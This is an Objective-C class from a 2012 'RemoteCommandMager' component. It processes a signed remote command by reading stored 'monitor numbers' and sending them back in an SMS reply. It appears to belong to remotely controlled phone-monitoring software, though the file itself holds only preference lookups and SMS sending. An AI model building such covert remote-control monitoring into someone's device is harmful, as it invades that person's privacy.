
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryMonitorsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryMonitorsProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface QueryMonitorsProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryMonitors;
@end

@implementation QueryMonitorsProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryMonitorsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (QueryMonitorsProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryMonitorsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryMonitorsProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryMonitorsProcessor--->doProcessingCommand")
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"QueryMonitorsProcessor"
												  reason:@"Failed signature check"];
	}
	
    [self processQueryMonitors];
}

#pragma mark QueryMonitorsProcessor PrivateAPI

/**
 - Method name: processQueryMonitors
 - Purpose:This method is used to process query monitors
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processQueryMonitors {
	DLog (@"QueryMonitorsProcessor--->processQueryMonitors")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	NSArray *monitors=[prefMonitor mMonitorNumbers];
	NSString *result=NSLocalizedString(@"kQueryMonitors", @"");
	for (NSString *monitorNumber in monitors) {
		DLog(@"monitor number: %@", monitorNumber)
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:monitorNumber];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	
	DLog (@"QueryMonitorsProcessor--->sendReplySMSWithResult")
	
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryMonitorMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryMonitorMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryMonitorMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}



@end
